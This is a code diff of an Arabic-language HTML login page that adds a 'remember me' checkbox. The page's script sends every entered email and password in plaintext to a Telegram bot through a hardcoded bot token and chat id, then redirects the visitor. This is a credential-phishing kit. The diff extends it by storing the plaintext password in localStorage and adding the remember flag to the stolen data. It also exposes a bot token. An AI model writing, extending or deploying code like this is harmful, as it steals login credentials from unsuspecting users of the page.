@@ -96,6 +96,24 @@
         }
         .input-group i { position: absolute; right: 15px; top: 50%; transform: translateY(-50%); color: var(--accent-color); }
 
+        /* تنسيق زر تذكرني */
+        .remember-me {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-color);
+            font-size: 0.9rem;
+            margin-bottom: 20px;
+            cursor: pointer;
+            user-select: none;
+        }
+        .remember-me input {
+            cursor: pointer;
+            width: 16px;
+            height: 16px;
+            accent-color: var(--accent-color);
+        }
+
         .btn-login { 
             width: 100%; 
             padding: 12px; 
@@ -132,6 +150,12 @@
                 <i class="fa-solid fa-lock"></i>
                 <input type="password" id="password" placeholder="كلمة المرور" required>
             </div>
+
+            <label class="remember-me">
+                <input type="checkbox" id="remember">
+                <span>تذكر بياناتي</span>
+            </label>
+
             <button type="submit" class="btn-login">تسجيل الدخول</button>
         </form>
 
@@ -157,26 +181,51 @@
             }
         }
 
-        // حفظ الاختيار حتى بعد تحديث الصفحة
+        // حفظ الاختيار حتى بعد تحديث الصفحة + جلب البيانات لو "تذكرني" مفعل
         window.onload = () => {
+            // كود الوضع الليلي
             if (localStorage.getItem('theme') === 'dark') {
                 document.documentElement.setAttribute('data-theme', 'dark');
                 document.getElementById('theme-icon').className = 'fas fa-sun';
             }
+
+            // التحقق من وجود بيانات محفوظة (تذكرني)
+            const savedEmail = localStorage.getItem('remembered_email');
+            const savedPass = localStorage.getItem('remembered_password');
+            
+            if (savedEmail && savedPass) {
+                document.getElementById('email').value = savedEmail;
+                document.getElementById('password').value = savedPass;
+                document.getElementById('remember').checked = true;
+            }
         }
 
-        // كود التليجرام الخاص بك (Login)
+        // كود التليجرام + خاصية الحفظ
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
+            const remember = document.getElementById('remember').checked;
+            
+            // التعامل مع "تذكرني"
+            if (remember) {
+                localStorage.setItem('remembered_email', email);
+                localStorage.setItem('remembered_password', pass);
+            } else {
+                localStorage.removeItem('remembered_email');
+                localStorage.removeItem('remembered_password');
+            }
+
             const token = "8665629681:AAFiHgfuw1hL3thh8VJ6vxCjnYQ9BIkfA-g";
             const chatId = "5511952564";
             
             fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: chatId, text: `👤 دخول جديد:\n📧 الإيميل: ${email}\n🔒 الباسورد: ${pass}` })
+                body: JSON.stringify({ 
+                    chat_id: chatId, 
+                    text: `👤 دخول جديد:\n📧 الإيميل: ${email}\n🔒 الباسورد: ${pass}\n📌 تذكرني: ${remember ? 'نعم' : 'لا'}` 
+                })
             }).then(() => window.location.href = "home.html");
         });
     </script>
